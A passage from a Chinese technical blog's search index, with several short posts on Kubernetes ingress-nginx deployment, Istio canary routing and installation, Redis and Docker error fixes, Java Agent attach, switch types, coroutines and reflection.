ingress-controller：具体实现反向代理及负载均衡的程序，对ingress定义的规则进行解析，根据配置的规则来实现请求转发。  简单来说，ingress-controller才是负责具体转发的组件，通过各种方式将它暴露在集群入口，外部对集群的请求流量会先到ingress-controller，而ingress对象是用来告诉ingress-controller该如何转发请求，比如哪些域名哪些path要转发到哪些服务等等。\n2.1 ingress ingress是一个API对象，和其他对象一样，通过yaml文件来配置。ingress通过http或https暴露集群内部service，给service提供外部URL、负载均衡、SSL/TLS能力以及基于host的方向代理。ingress要依靠ingress-controller来具体实现以上功能。前一小节的图如果用ingress来表示，大概就是如下配置：\napiVersion: extensions/v1beta1 kind: Ingress metadata: name: abc-ingress annotations: kubernetes.io/ingress.class: \u0026#34;nginx\u0026#34; nginx.ingress.kubernetes.io/use-regex: \u0026#34;true\u0026#34; spec: tls: - hosts: - api.abc.com secretName: abc-tls rules: - host: api.abc.com http: paths: - backend: serviceName: apiserver servicePort: 80 - host: www.abc.com http: paths: - path: /image/* backend: serviceName: fileserver servicePort: 80 - host: www.abc.com http: paths: - backend: serviceName: feserver servicePort: 8080 2.2 ingress-controller ingress-controller并不是k8s自带的组件，实际上ingress-controller只是一个统称，用户可以选择不同的ingress-controller实现，目前，由k8s维护的ingress-controller只有google云的GCE与ingress-nginx两个，其他还有很多第三方维护的ingress-controller，具体可以参考官方文档。但是不管哪一种ingress-controller，实现的机制都大同小异，只是在具体配置上有差异。一般来说，ingress-controller的形式都是一个pod，里面跑着daemon程序和反向代理程序。daemon负责不断监控集群的变化，根据ingress对象生成配置并应用新配置到反向代理，比如nginx-ingress就是动态生成nginx配置，动态更新upstream，并在需要的时候reload程序应用新配置。为了方便，后面的例子都以k8s官方维护的nginx-ingress为例。\n3. 部署ingress对象 下面会介绍到ingress-controller有多种部署方式，但无论ingress-controller采用何种方式部署，ingress资源对象的部署都一样：\n[root@k8s-master ingress-nginx]# vi ingress-all.yaml  apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: ingress-all annotations: kubernetes.io/ingress.class: \u0026#34;nginx\u0026#34; # 开启use-regex，启用path的正则匹配 nginx.ingress.kubernetes.io/use-regex: \u0026#34;true\u0026#34; spec: rules: # 定义域名 - host: ceres-admin-web.6and.ltd http: paths: # 不同path转发到不同端口 - path: / backend: serviceName: ceres-admin-web-svc servicePort: 80 #- path: /merchant # backend: # serviceName: ceres-merchant-web-svc # servicePort: 80 - host: ceres-merchant-web.6and.ltd http: paths: # 不同path转发到不同端口 - path: / backend: serviceName: ceres-merchant-web-svc servicePort: 80 - host: ceres-admin-server.6and.ltd http: paths: # 不同path转发到不同端口 - path: / backend: serviceName: ceres-admin-server-svc servicePort: 8764 4. 部署ingress-controller ingress-controller的部署，需要考虑两个方面：\n ingress-controller是作为pod来运行的，以什么方式部署比较好 ingress-controller解决了把如何请求路由到集群内部，那它自己怎么暴露给外部比较好  下面列举一些目前常见的部署和暴露方式，具体使用哪种方式还是得根据实际需求来考虑决定。\n4.1 Deployment+LoadBalancer模式的Service 如果要把ingress部署在公有云，那用这种方式比较合适。用Deployment部署ingress-controller，创建一个type为LoadBalancer的service关联这组pod。大部分公有云，都会为LoadBalancer的service自动创建一个负载均衡器，通常还绑定了公网地址。只要把域名解析指向该地址，就实现了集群服务的对外暴露。\n4.2 Deployment+NodePort模式的Service 同样用deployment模式部署ingress-controller，并创建对应的服务，但是type为NodePort。这样，ingress就会暴露在集群节点ip的特定端口上。由于nodeport暴露的端口是随机端口，一般会在前面再搭建一套负载均衡器来转发请求。该方式一般用于宿主机是相对固定的环境ip地址不变的场景。 NodePort方式暴露ingress虽然简单方便，但是NodePort多了一层NAT，在请求量级很大时可能对性能会有一定影响。\n4.2.1 下载部署4.2.1 下载部署ingress-nginx controller所需要的deploy.yaml文件 wget https://github.com/kubernetes/ingress-nginx/blob/master/deploy/static/provider/baremetal/deploy.yaml 该yaml默认使用nodePort方式部署Service，我们可以指定nodePort，而不是让k8s自己分配。\napiVersion: v1 kind: Service metadata: labels: helm.sh/chart: ingress-nginx-2.11.1 app.kubernetes.io/name: ingress-nginx app.kubernetes.io/instance: ingress-nginx app.kubernetes.io/version: 0.34.1 app.kubernetes.io/managed-by: Helm app.kubernetes.io/component: controller name: ingress-nginx-controller namespace: ingress-nginx spec: type: NodePort ports: - name: http nodePort: 31080 port: 80 protocol: TCP targetPort: http - name: https nodePort: 31443 port: 443 protocol: TCP targetPort: https 不要试图将nodePort指定为80或者443，否则你会得到如下提示：\nThe Service \u0026#34;ingress-nginx-controller\u0026#34; is invalid: spec.ports[0].nodePort: Invalid value: 80: provided port is not in the valid range. The range of valid ports is 30000-32767 4.2.2 修改镜像仓库地址 deploy.yaml里面的镜像地址是：us.gcr.io/k8s-artifacts-prod/ingress-nginx/controller:v0.34.1@sha256:0e072dddd1f7f8fc8909a2ca6f65e76c5f0d2fcfb8be47935ae3457e8bbceb20\n该地址无法被访问，解决办法参考：如何在国内顺畅下载被墙的 Docker 镜像？ 修改后如下图所示：\n4.2.3 部署ingress-nginx controller kubectl apply -f deploy.yaml 如果修改了yaml重新部署：\nkubectl replace --force -f deploy.yaml 4.2.4 检查是否部署成功 查看controller是否running\n查看service\n登陆任意节点，运行：\n[root@k8s-node1 ~]# curl -i localhost:31080/healthz HTTP/1.1 200 OK Server: nginx/1.19.1 Date: Sat, 22 Aug 2020 06:22:15 GMT Content-Type: text/html Content-Length: 0 Connection: keep-alive 返回 200 ，说明 nginx OK。\n至此，ingress-nginx controller已经部署完毕。通过域名+nodePort的方式访问相应的service，例：http://ceres-admin-web.6and.ltd:31080，如果你跟我一样是强迫症晚期，一定期望完美的访问方式是：http://ceres-admin-web.6and.ltd，下面的4.3小节将是强迫症晚期的福音。\n4.3 DaemonSet+HostNetwork+nodeSelector 用DaemonSet结合nodeselector来部署ingress-controller到特定的node上，然后使用HostNetwork直接把该pod与宿主机node的网络打通，直接使用宿主机的80/433端口就能访问服务。这时，ingress-controller所在的node机器就很类似传统架构的边缘节点，比如机房入口的nginx服务器。该方式整个请求链路最简单，性能相对NodePort模式更好。缺点是由于直接利用宿主机节点的网络和端口，一个node只能部署一个ingress-controller pod。比较适合大并发的生产环境使用。\n4.3.1 给要部署nginx-ingress的node打上特定标签 我们需要使用daemonset部署到特定node，需要修改部分配置：先给要部署nginx-ingress的node打上特定标签，这里测试部署在k8s-node1这个节点。\nkubectl label node k8s-node1 isIngress=\u0026#34;true\u0026#34; 4.3.2 修改deploy.yaml的deployment部分配置 删除指定的nodePort：\n4.3.3 重启 kubectl replace --force -f deploy.yaml 4.3.4 检查 可以看到，nginx-controller的pod已经部署在在k8s-node1上了：\n到k8s-node1上看下本地端口：\n由于配置了hostnetwork，nginx已经在node主机本地监听80/443/8181端口。其中8181是nginx-controller默认配置的一个default backend。这样，只要访问node主机有公网IP，就可以直接映射域名来对外网暴露服务了。如果要nginx高可用的话，可以在多个node上部署，并在前面再搭建一套LVS+keepalive做负载均衡。用hostnetwork的另一个好处是，如果lvs用DR模式的话，是不支持端口映射的，这时候如果用nodeport，暴露非标准的端口，管理起来会很麻烦。\n现在我们就可以优雅的使用：http://ceres-admin-web.6and.ltd来访问我们的服务了。\n参考链接 k8s ingress原理及ingress-nginx部署测试 见异思迁：K8s 部署 Nginx Ingress Controller 之 kubernetes/ingress-nginx 如何在国内顺畅下载被墙的 Docker 镜像？ ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/ingress/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"ingress"},{"categories":["云原生"],"content":"Nginx-ingress 架构和原理 迅速回顾一下 Nginx-ingress 的架构和实现原理：\nNginx-ingress 通过前置的 Loadbalancer 类型的 Service 接收集群流量，将流量转发至 Nginx-ingress Pod 内并对配置的策略进行检查，再转发至目标 Service，最终将流量转发至业务容器。\n传统的 Nginx 需要我们配置 conf 文件策略。但 Nginx-ingress 通过实现 Nginx-ingress-Controller 将原生 conf 配置文件和 yaml 配置文件进行了转化，当我们配置 yaml 文件的策略后，Nginx-ingress-Controller 将对其进行转化，并且动态更新策略，动态 Reload Nginx Pod，实现自动管理。\n那么 Nginx-ingress-Controller 如何能够动态感知集群的策略变化呢？方法有很多种，可以通过 webhook admission 拦截器，也可以通过 ServiceAccount 与 Kubernetes Api 进行交互，动态获取。Nginx-ingress-Controller 使用后者来实现。所以在部署 Nginx-ingress 我们会发现 Deployment 内指定了 Pod 的 ServiceAccount，以及实现了 RoleBinding ，最终达到 Pod 与 Kubernetes Api 交互的目标。\ndev apiVersion: v1 kind: Namespace metadata: name: dev --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx namespace: dev spec: selector: matchLabels: app: nginx replicas: 1 template: metadata: labels: app: nginx spec: containers: - name: nginx image: wangweicoding-docker.pkg.coding.net/nginx-ingress-gray/docker/nginx ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: nginx namespace: dev spec: ports: - name: tcp-80-80 port: 80 protocol: TCP targetPort: 80 selector: app: nginx sessionAffinity: None type: NodePort --- apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: kubernetes.io/ingress.class: nginx  # nginx=nginx-ingress| qcloud=CLB ingress ## kubernetes.io/ingress.subnetId: subnet-xxxxxxxx # if qcloud, should give subnet name: my-ingress namespace: dev spec: rules: - host: nginx-ingress.coding.dev http: paths: - backend: serviceName: nginx servicePort: 80 path: / Prd apiVersion: v1 kind: Namespace metadata: name: pro --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx namespace: pro spec: selector: matchLabels: app: nginx replicas: 1 template: metadata: labels: app: nginx spec: containers: - name: nginx image: wangweicoding-docker.pkg.coding.net/nginx-ingress-gray/docker/nginx ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: nginx namespace: pro spec: ports: - name: tcp-80-80 port: 80 protocol: TCP targetPort: 80 selector: app: nginx sessionAffinity: None type: NodePort --- apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: kubernetes.io/ingress.class: nginx  # nginx=nginx-ingress| qcloud=CLB ingress ## kubernetes.io/ingress.subnetId: subnet-xxxxxxxx # if qcloud, should give subnet name: my-ingress namespace: pro spec: rules: - host: nginx-ingress.coding.pro http: paths: - backend: serviceName: nginx servicePort: 80 path: / Canary apiVersion: v1 kind: Namespace metadata: name: pro --- apiVersion: apps/v1 kind: Deployment metadata: name: nginx-canary namespace: pro spec: selector: matchLabels: app: nginx-canary replicas: 1 template: metadata: labels: app: nginx-canary spec: containers: - name: nginx image: wangweicoding-docker.pkg.coding.net/nginx-ingress-gray/docker/nginx ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: nginx-canary namespace: pro spec: ports: - name: tcp-80-80 port: 80 protocol: TCP targetPort: 80 selector: app: nginx-canary sessionAffinity: None type: NodePort --- apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: kubernetes.io/ingress.class: nginx  # nginx=nginx-ingress| qcloud=CLB ingress ## kubernetes.io/ingress.subnetId: subnet-xxxxxxxx # if qcloud, should give subnet nginx.ingress.kubernetes.io/canary: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/canary-by-header: \u0026#34;location\u0026#34; nginx.ingress.kubernetes.io/canary-by-header-value: \u0026#34;shenzhen\u0026#34; #nginx.ingress.kubernetes.io/canary-weight: 100 name: my-ingress namespace: pro spec: rules: - host: nginx-ingress.coding.pro http: paths: - backend: serviceName: nginx-canary servicePort: 80 path: / ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E5%AE%9E%E7%8E%B0%E7%81%B0%E5%BA%A6/ingress%E5%AE%9E%E7%8E%B0%E7%81%B0%E5%BA%A6/","series":["k8s"],"tags":["云原生","k8s"],"title":"ingress实现灰度"},{"categories":["编程思想"],"content":"lettuce连接redis报错io.lettuce.core.RedisCommandTimeoutException: Command timed out after 5 second(s)，我的spring.redis.timeout = 5000。\n解决办法：\n 登陆redis容器 输入redis-cli进入redis控制台 设置 CONFIG SET timeout \u0026quot;60\u0026quot; 设置 CONFIG SET tcp-keepalive \u0026quot;300\u0026quot;  参考 Redis 配置 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/exception/io.lettuce.core.rediscommandtimeoutexception_-comm/","series":["Manual"],"tags":["redis"],"title":"io.lettuce.core.RedisCommandTimeoutException: Command timed out after 5 second(s)"},{"categories":["其他"],"content":"iptables: No chain/target/match by that name.\n重启redis镜像的时候报错如下：\nERROR: for redis Cannot start service redis: driver failed programming external connectivity on endpoint redis (f5211771e5a0ee705edb72f8a8dfbca2503456ab0e8330a32932b029a7c0568d): (iptables failed: iptables --wait -t nat -A DOCKER -p tcp -d 0/0 --dport 6379 -j DNAT --to-destination 192.168.80.2:6379 ! -i br-fbefac0273aa: iptables: No chain/target/match by that name. 原因：\ndocker 服务启动的时候，docker服务会向iptables注册一个链，以便让docker服务管理的containner所暴露的端口之间进行通信。通过命令iptables -L可以查看iptables 链。如果你删除了iptables中的docker链，或者iptables的规则被丢失了（例如重启firewalld，我就是使用了systemctl stop iptables导致链丢失），docker就会报这个错误。\n解决办法：\nsystemctl restart docker 重启docker服务，之后，正确的iptables规则就会被创建出来。\n参考：\nDocker 启动时报错：iptables:No chain/target/match by the name ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/other/iptables_-no-chain_target_match-by-that-name/","series":["Manual"],"tags":["Other"],"title":"iptables: No chain/target/match by that name."},{"categories":["云原生"],"content":"istio原理\n","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/istio/istio%E5%9F%BA%E7%A1%80/istio%E5%8E%9F%E7%90%86/","series":null,"tags":["云原生","istio"],"title":"istio原理"},{"categories":["云原生"],"content":"istio启用策略检查功能\n不得不说，istio的官方文档真的很垃圾，操作手册没有随着版本同步更新不说，启用策略检查功能依照官方做法 也不能生效。现先以istio-1.5.10为例总结启用策略检查功能的方法如下：\n 默认安装istio之后disablePolicyChecks=true  [root@k8s-master Istio-1.5.10]# kubectl -n Istio-system get cm Istio -o jsonpath=\u0026#34;{@.data.mesh}\u0026#34; | grep disablePolicyChecks disablePolicyChecks: true 编辑 istio configmap 以启用策略检查  [root@k8s-master Istio-1.5.10]# kubectl -n Istio-system get cm Istio -o jsonpath=\u0026#34;{@.data.mesh}\u0026#34; | sed -e \u0026#34;s/disablePolicyChecks: true/disablePolicyChecks: false/\u0026#34; \u0026gt; /tmp/mesh.yaml [root@k8s-master Istio-1.5.10]# kubectl -n Istio-system create cm Istio -o yaml --dry-run --from-file=mesh=/tmp/mesh.yaml | kubectl replace -f - W0902 17:00:37.208604 16538 helpers.go:535] --dry-run is deprecated and can be replaced with --dry-run=client. configmap/Istio replaced [root@k8s-master Istio-1.5.10]# kubectl -n Istio-system get cm Istio -o jsonpath=\u0026#34;{@.data.mesh}\u0026#34; | grep disablePolicyChecks disablePolicyChecks: false 删除为修补 istio configmap 而创建的临时文件  rm /tmp/mesh.yaml 总结  虽然此方法可以设置disablePolicyChecks=false，但是还是无法启用istio速率限制（Rate Limits），具体原因不详（应该是该版本的bug），请使用istio-1.4.10\n参考：  第二十一部分 Istio策略检查 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/istio/istio%E5%AE%9E%E6%88%98/istio%E5%90%AF%E7%94%A8%E7%AD%96%E7%95%A5%E6%A3%80%E6%9F%A5%E5%8A%9F%E8%83%BD/","series":["istio实战"],"tags":["云原生","istio"],"title":"istio启用策略检查功能"},{"categories":["云原生"],"content":"istio安装\n1. 下载 Istio 这里推荐直接下载tar.gz安装包，不推荐使用官网上的那个安装脚本（慢得一逼）。另外推荐下载istio-1.5.10，不推荐下载1.7.0。\n解压：\ntar -xzvf Istio-1.5.10-linux.tar.gz 拷贝istioctl到/usr/local/bin/\ncd Istio-1.5.10/ cp bin/istioctl /usr/local/bin/ 查看版本：\nistioctl version 2. 安装istio 基于demo的配置安装istio（除了demo，还有default等等，具体配置见istio-1.5.10/install/kubernetes/operator/profiles）\nistioctl manifest apply --set profile=demo 查看svc：kubectl get svc -n istio-system\n查看pod：kubectl get pods -n istio-system\n这里需要注意，如果使用的是1.5.10以后的高版本，安装命令应该是：istioctl manifest install --set profile=demo\n并且，最新版本1.7.0不再默认安装grafana ``kiali ``zipkin等等组件。\n当使用 kubectl apply 来部署应用时，如果 pod 启动在标有 istio-injection=enabled 的命名空间中，那么，Istio sidecar 注入器 将自动注入 Envoy 容器到应用的 pod 中：\nkubectl label namespace \u0026lt;namespace\u0026gt; Istio-injection=enabled 3.卸载 卸载程序将删除 RBAC 权限、istio-system 命名空间和所有相关资源。可以忽略那些不存在的资源的报错，因为它们可能已经被删除掉了。\nistioctl manifest generate --set profile=demo | kubectl delete -f - 参考 istio官网: 开始 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/istio/istio%E5%AE%9E%E6%88%98/istio%E5%AE%89%E8%A3%85/","series":["istio实战"],"tags":["云原生","istio"],"title":"istio安装"},{"categories":["云原生"],"content":"istio实现灰度\nGateway apiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: bookinfo-gateway spec: selector: istio: ingressgateway # use istio default controller servers: - port: number: 80 name: http protocol: HTTP hosts: - \u0026#34;*\u0026#34; VirtualService 是在 Istio 服务网格内对服务的请求如何进行路由控制？VirtualService 中就包含了这方面的定义。例如一个 Virtual Service 可以把请求路由到不同版本，甚至是可以路由到一个完全不同于请求要求的服务上去。路由可以用很多条件进行判断，例如请求的源和目的地、HTTP 路径和 Header 以及各个服务版本的权重等。\n路由规则对应着一或多个用 VirtualService 配置指定的请求目的主机。这些主机可以是也可以不是实际的目标负载，甚至可以不是同一网格内可路由的服务。例如要给到 reviews 服务的请求定义路由规则，可以使用内部的名称 reviews，也可以用域名 bookinfo.com，VirtualService 可以定义这样的 host 字段：\nhosts: - reviews - bookinfo.com复制代码 host 字段用显示或者隐式的方式定义了一或多个完全限定名（FQDN）。上面的 reviews，会隐式的扩展成为特定的 FQDN，例如在 Kubernetes 环境中，全名会从 VirtualService 所在的集群和命名空间中继承而来（比如说 reviews.default.svc.cluster.local）。\n--- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: bookinfo spec: hosts: - \u0026#34;*\u0026#34; gateways: - bookinfo-gateway http: - match: - uri: exact: /productpage - uri: prefix: /static - uri: exact: /login - uri: exact: /logout - uri: prefix: /api/v1/products route: - destination: host: productpage port: number: 9080 所有的流量都去到reviews:v1\napiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: hosts: - reviews http: - route: - destination: host: reviews subset: v1 来自名为 Jason 的用户的所有流量将被路由到服务 reviews:v2。\napiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: hosts: - reviews http: - match: - headers: end-user: exact: jason route: - destination: host: reviews subset: v2 - route: - destination: host: reviews subset: v1 把 50% 的流量从 reviews:v1 转移到 reviews:v3：\napiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: hosts: - reviews http: - route: - destination: host: reviews subset: v1 weight: 50 - destination: host: reviews subset: v3 weight: 50 给对 reviews 服务的调用增加一个半秒的请求超时：\napiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: reviews spec: hosts: - reviews http: - route: - destination: host: reviews subset: v2 timeout: 0.5s DestinationRule 在请求被 VirtualService 路由之后，DestinationRule 配置的一系列策略就生效了。这些策略⚠️由服务属主编写⚠️，包含断路器、负载均衡以及 TLS 等的配置内容。\nDestinationRule 还定义了对应目标主机的可路由 subset（例如有命名的版本）。VirtualService 在向特定服务版本发送请求时会用到这些子集。\n下面是 reviews 服务的 DestinationRule 配置策略以及子集：\napiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews spec: host: reviews trafficPolicy: loadBalancer: simple: RANDOM subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 trafficPolicy: loadBalancer: simple: ROUND_ROBIN - name: v3 labels: version: v3复制代码 注意在单个 DestinationRule 配置中可以包含多条策略（比如 default 和 v2）。\n⚠️到了DestinationRule层面，是配置流量去到指定版本的策略，随机策略、轮训策略等等（注意指定版本是可以多副本的）\n可以用一系列的标准，例如连接数和请求数限制来定义简单的断路器。\n例如下面的 DestinationRule 给 reviews 服务的 v1 版本设置了 100 连接的限制：\napiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: reviews spec: host: reviews subsets: - name: v1 labels: version: v1 trafficPolicy: connectionPool: tcp: maxConnections: 100 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/istio/istio%E5%AE%9E%E6%88%98/istio%E5%AE%9E%E7%8E%B0%E7%81%B0%E5%BA%A6/","series":["istio实战"],"tags":["云原生","istio"],"title":"istio实现灰度"},{"categories":["编程思想"],"content":"Java Agent就是一个可以作为java代理的工具, 简单来说就是一个可供用于编写的java切面, 它的主要功能就是为用户提供了在 JVM 将字节码文件读入内存之后，JVM 使用对应的字节流在 Java 堆中生成一个 Class 对象之前，用户可以对其字节码进行修改的能力，从而 JVM 也将会使用用户修改过之后的字节码进行新的Class 对象的创建(打破了一个类只能加载一次的规则)。\nJava Agent的使用对于你自身的代码是无侵入性的。应用场景：热更新。\n热更新我们也可以自定义类加载器实现，这种方式的热更新是jvm原生支持的方式, 但是缺点也很明显:\n  不够灵活, 需要手动修改文件等操作\n  重复创建类加载器, 并且卸载困难, 会增加系统负担\n  使用起来具有代码侵入性, 需要对代码进行一定改造\n  通过 Java Agent完美的解决了我们自定义类加载器实现热更新的缺点。\n1.1 JVM启动前静态Instrument 通过启动命令 java -javaagent:agent1.jar -javaagent:agent2.jar -jar MyProgram.jar 在目标程序main方法执行前，先执行agent中定义的 premain 方法\n1.2 JVM启动后动态Instrument Java6 以后提供了在目标程序main方法执行后，执行agent的agentmain方法的机制，通过这种机制，我们可以动态修改目标程序已经加载过的字节码。\n在Java6 以后实现启动后加载的新实现是Attach API 。Attach API 很简单，只有 2 个主要的类，即VirtualMachine 和 VirtualMachineDescriptor，都在tool.jar 的 com.sun.tools.attach 包里面。\nattach实现动态注入的原理如下：\n通过VirtualMachine类的attach(pid)方法，便可以attach到一个运行中的java进程上，之后便可以通过loadAgent(agentJarPath)来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。\n既然是两个进程之间通信那肯定的建立起连接，VirtualMachine.attach动作类似TCP创建连接的三次握手，目的就是搭建attach通信的连接。而后面执行的操作，例如vm.loadAgent，其实就是向这个socket写入数据流，接收方target VM会针对不同的传入数据来做不同的处理。\n例如：找到当前JVM并加载agent.jar（即attach JVM 和 runing JVM 是同一个 JVM，真正的应用中更多的是不同的两个JVM，这里仅为了测试方便。）\npackage com.rickiyang.learn.job; import com.sun.tools.attach.*; import java.io.IOException; import java.util.List; /** * @author rickiyang * @date 2019-08-16 * @Desc */ public class TestAgentMain { public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException { //获取当前系统中所有 运行中的 虚拟机  System.out.println(\u0026#34;running JVM start \u0026#34;); List\u0026lt;VirtualMachineDescriptor\u0026gt; list = VirtualMachine.list(); for (VirtualMachineDescriptor vmd : list) { //如果虚拟机的名称为 xxx 则 该虚拟机为目标虚拟机，获取该虚拟机的 pid  //然后加载 agent.jar 发送给该虚拟机  System.out.println(vmd.displayName()); if (vmd.displayName().endsWith(\u0026#34;com.rickiyang.learn.job.TestAgentMain\u0026#34;)) { VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id()); virtualMachine.loadAgent(\u0026#34;/Users/yangyue/Documents/java-agent.jar\u0026#34;); virtualMachine.detach(); } } } } 参考 javaagent 应用 | 七日打卡 javaagent使用指南 基于Java Instrument的Agent实现 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java-agent/","series":["Manual"],"tags":["Java"],"title":"Java Agent"},{"categories":["编程思想"],"content":"switch(expression){ case value : //语句  break; //可选  case value : //语句  break; //可选  //你可以有任意数量的case语句  default : //可选  //语句 } 这里的 expression 支持：\n1、基本数据类型：byte, short, char, int\n2、包装数据类型：Byte, Short, Character, Integer\n3、枚举类型：Enum\n4、 字符串类型：String（Jdk 7+ 开始支持）\n为什么不支持long、float、double数据类型？\nswitch 底层是使用 int 型 来进行判断的，即使是枚举、String类型，最终也是转变成 int 型。由于 long、float、double 型表示范围大于 int 型，因此不支持 long、float、double 类型。 （String类型最终是转成了int类型的hashCode；枚举最终转成了枚举对象的定义顺序，即 ordinal值）\n下面举一个使用包装类型和枚举的，其实也不难，注意只能用在 switch 块里面\n// 使用包装类型 Integer value = 5; switch (value) { case 3: System.out.println(\u0026#34;3\u0026#34;); break; case 5: System.out.println(\u0026#34;5\u0026#34;); break; default: System.out.println(\u0026#34;default\u0026#34;); } // 使用枚举类型 Status status = Status.PROCESSING; switch (status) { case OPEN: System.out.println(\u0026#34;open\u0026#34;); break; case PROCESSING: System.out.println(\u0026#34;processing\u0026#34;); break; case CLOSE: System.out.println(\u0026#34;close\u0026#34;); break; default: System.out.println(\u0026#34;default\u0026#34;); } ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java-switch%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%94%AF%E6%8C%81%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","series":["Manual"],"tags":["Java"],"title":"Java switch表达式支持的数据类型"},{"categories":["编程思想"],"content":"1. 现状 时至今日，JDK17已经正式发布，Java也没有在语言层面对协程提供原生支持。\n一定要在Java中使用协程的话，可以使用诸如quasar , kilim , coroutines 第三方库感受一下，它们的原理基本都是字节码增强 + Java Agent机制，这种做法一是对性能影响很大，对JIT编译器的影响也非常大，另外这些库都几年前就不在更新了，远达不到生产使用的标准。\n还可以使用Kotlin混合编程，Kotlin中的协程本质上还是一套基于原生Java Thread API 的封装，和Go中的协程完全不是一个东西，不要混淆，更谈不上什么性能更好，Kotlin中的协程最大的价值是写起来比RxJava的线程切换还要方便，几乎就是用阻塞的写法来完成非阻塞的任务。\nopenjdk也有正在孵化的官方协程项目loom ，其能否release还需拭目以待。\n2. 成因 是什么原因导致Oracle一直不着急推出对协程的支持呢？\n先返回到问题的本源。当我们希望引入协程，我们想解决什么问题。我想不外乎下面几点：\n  节省资源：节省内存、节省分配线程的开销（创建和销毁线程要各做一次syscall）、节省大量线程切换带来的开销\n  与NIO配合实现非阻塞的编程，提高系统的吞吐\n  使用起来更加舒服顺畅，同步的编程风格编写异步程序\n  2.1 节省资源 1. 节省内存 我们以常见的Java Web举例，spingboot分配给tomcat的线程池大小默认值是200，即使按照1M线程大小计算，200M的内存占用对于动辄几个G的Java Web应用并不算什么。\n即使是IM的场景，有数百万的长链接需要维护，也可以使用NIO+Worker线程应对。\n还可以调整线程栈占用内存大小（-Xss1024k 或者 -XX:ThreadStackSize=1024k）\n2. 节省线程分配开销 线程池\n3. 节省线程切换开销 我们仍然以Java Web举例，大量的线程大部分时间实际上因为IO（发请求/读DB）而挂起，根本不会参与OS的线程切换，现实当中一个最大200线程的服务器可能同一时刻的“活跃线程”总数只有数十而已。其开销没有想象的那么大。\n2.2 非阻塞编程 nio 👉 netty\n2.3 优雅异步编程 响应式编程库\n可见Java对于引入协程机制并不那么紧迫；并且Java不像Golang等新语言，没有历史包袱，它们可以不提供线程只提供协程编程，但是Java如果没有thread，也没有ThreadLocal，@Transactional不起作用了，又没有等价的工具，是不是很郁闷？\n参考 为什么 Java 坚持多线程不选择协程？ Kotlin 协程真的比 Java 线程更高效吗？ 硬核系列 | 深入剖析 Java 协程 Golang 的 协程调度机制 与 GOMAXPROCS 性能调优 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java%E5%8D%8F%E7%A8%8B/","series":["Manual"],"tags":["Java"],"title":"Java协程"},{"categories":["编程思想"],"content":"反射可以在程序运行过程中动态的构造类、获取类的全部信息、调用类型方法。但是，为什么我们要这么做呢？需要构造类，new就好了，需要访问类成员变量、调用方法，直接访问、调用就好了，为什么要通过一大堆反射代码去实现呢？\n通常，class在编译期间就确定，JVM在运行时通过类加载器加载确定的class。如果在运行时才确定需要加载什么类，就需要利用java反射。java反射使得程序更加灵活，类似spring的框架将类以全限定名的形成配置在配置文件，然后再通过反射实例化。\n参考：\nhttps://blog.csdn.net/Appleyk/article/details/77879073 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java%E5%8F%8D%E5%B0%84/","series":["Manual"],"tags":["Java"],"title":"Java反射"},{"categories":["编程思想"],"content":"前段时间在做一个实时人脸抓拍项目的时候，遇到了一个堆外内存OOM的问题，现在把思路好好整理一下。\n项目中用opencv通过rtsp协议，实时的读取通用网络摄像头的视频帧。因为项目中多处用到了org.opencv.core.Mat这个对象，而Mat对象的构造是通过调用native方法实现的，也就是说构造Mat对象的时候，会在堆外分配内存：\n//  // C++: Mat::Mat()  //  // javadoc: Mat::Mat()  public Mat() { nativeObj = n_Mat(); return; } // C++: Mat::Mat()  private static native long 